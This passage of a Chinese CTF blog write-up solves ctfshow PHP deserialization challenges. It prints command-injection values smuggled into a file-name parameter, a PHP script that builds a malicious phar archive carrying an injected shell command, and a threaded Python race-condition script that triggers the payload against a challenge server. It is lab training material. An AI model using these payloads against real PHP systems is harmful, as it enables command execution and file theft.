if(preg_match(&#x27;/php|\.\./i&#x27;, $this-&gt;filename))&#123;<br>            $this-&gt;evilfile=true;<br>        &#125;<br>        if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123;<br>            $this-&gt;evilfile=true;<br>        &#125;<br>        return $this-&gt;evilfile;<br>    &#125;<br>    public function __destruct()&#123;<br>        if($this-&gt;evilfile)&#123;<br>            system(&#x27;rm &#x27;.$this-&gt;filename);<br>        &#125;<br>    &#125;<br>&#125;<br><br>if(isset($_GET[&#x27;fn&#x27;]))&#123;<br>    $content = file_get_contents(&#x27;php://input&#x27;);<br>    $f = new filter($_GET[&#x27;fn&#x27;],$content);<br>    if($f-&gt;checkevil()===false)&#123;<br>        file_put_contents($_GET[&#x27;fn&#x27;], $content);<br>        copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;);<br>        unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]);<br>        echo &#x27;work done&#x27;;<br>    &#125;<br>    <br>&#125;else&#123;<br>    echo &#x27;where is flag?&#x27;;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们先分析一下毫无疑问__construct和__destruct必定会被触发，fn控制filename的值，然后只要有php或者flag就会让evilfile&#x3D;true;</p>
+<p>我们可以直接闭合RCE？</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">GET :<br>?fn=php;ls<br>system(&#x27;rm php;ls&#x27;);<br>?fn=php;tac flag.php<br>system(&#x27;rm php;tac flag.php&#x27;);<br></code></pre></td></tr></table></figure>
+
+<h3 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-12-08 19:13:36<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-12-08 20:08:07<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>highlight_file(__FILE__);<br><br>class filter&#123;<br>    public $filename;<br>    public $filecontent;<br>    public $evilfile=false;<br>    public $admin = false;<br><br>    public function __construct($f,$fn)&#123;<br>        $this-&gt;filename=$f;<br>        $this-&gt;filecontent=$fn;<br>    &#125;<br>    public function checkevil()&#123;<br>        if(preg_match(&#x27;/php|\.\./i&#x27;, $this-&gt;filename))&#123;<br>            $this-&gt;evilfile=true;<br>        &#125;<br>        if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123;<br>            $this-&gt;evilfile=true;<br>        &#125;<br>        return $this-&gt;evilfile;<br>    &#125;<br>    public function __destruct()&#123;<br>        if($this-&gt;evilfile &amp;&amp; $this-&gt;admin)&#123;<br>            system(&#x27;rm &#x27;.$this-&gt;filename);<br>        &#125;<br>    &#125;<br>&#125;<br><br>if(isset($_GET[&#x27;fn&#x27;]))&#123;<br>    $content = file_get_contents(&#x27;php://input&#x27;);<br>    $f = new filter($_GET[&#x27;fn&#x27;],$content);<br>    if($f-&gt;checkevil()===false)&#123;<br>        file_put_contents($_GET[&#x27;fn&#x27;], $content);<br>        copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;);<br>        unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]);<br>        echo &#x27;work done&#x27;;<br>    &#125;<br>    <br>&#125;else&#123;<br>    echo &#x27;where is flag?&#x27;;<br>&#125;<br>#与上题比较多了一个phar<br></code></pre></td></tr></table></figure>
+
+<p>因为我们无法控制admin，所以这下我们需要用另外的方法了</p>
+<p>我们可以利用<code>unlink(_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;/&#39;._GET[&#39;fn&#39;]);</code>，他会销毁filename文件，我们自然而然地想到Phar协议解析文件时,会自动触发对manifest字段的序列化字符串进行反序列化，那我们可以根据这个东西写一个phar</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br><br>highlight_file(__FILE__);<br><br>class filter&#123;<br>    public $filename;<br>    public $filecontent;<br>    public $evilfile=true;<br>    public $admin = true;<br><br>    public function __construct($f=&#x27;&#x27;,$fn=&#x27;&#x27;)&#123;<br>        $this-&gt;filename=&#x27;1;tac fla?.ph?&#x27;;<br>        $this-&gt;filecontent=&#x27;&#x27;;<br>    &#125;<br>&#125;<br><br>$phar = new Phar(&quot;phar.phar&quot;);<br>$phar-&gt;startBuffering();<br>$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);<br><br>$o=new filter();<br>$phar-&gt;setMetadata($o);<br>$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);<br>$phar-&gt;stopBuffering();<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>然后把文件写进去</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs text">import threading<br>import requests<br><br>url = &quot;http://e474da8b-d7ec-4090-92a9-26547ad646f8.challenge.ctf.show/&quot;<br>content = open(&quot;web276.phar&quot;, &quot;rb&quot;).read()<br>found_flag = False<br><br>def upload():<br>    requests.post(url=url + &quot;?fn=web276.phar&quot;, data=content)<br><br>def read():<br>    global found_flag<br>    response = requests.post(url=url + &quot;?fn=phar://web276.phar/&quot;, data=&quot;1&quot;)<br>    if &quot;ctfshow&#123;&quot; in response.text or &quot;flag&#123;&quot; in response.text:<br>        print(response.text)<br>        found_flag = True<br><br>while not found_flag:<br>    threading.Thread(target=upload).start()<br>    threading.Thread(target=read).start()<br>#至于为什么用条件竞争，因为会删除filename的缘故，我们需要在删除前访问phar，才能保证反序列化的有效进行<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF%E9%A2%98%E8%A7%A3/" class="category-chain-item">CTF题解</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF%E9%A2%98%E8%A7%A3/ctfshow/" class="category-chain-item">ctfshow</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctfshow/" class="print-no-link">#ctfshow</a>
+      
+        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="print-no-link">#反序列化</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ctfshow 反序列化题解</div>
+      <div>https://xendr1a.github.io/2025/08/20/ctfshow-deser/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xendr1a</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年8月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/08/30/LitCTF2025-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-web/" title="LitCTF 2025 公开赛道 Web">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">LitCTF 2025 公开赛道 Web</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/08/05/ctfshow-sql/" title="ctfshow SQL 注入题解">
+                        <span class="hidden-mobile">ctfshow SQL 注入题解</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
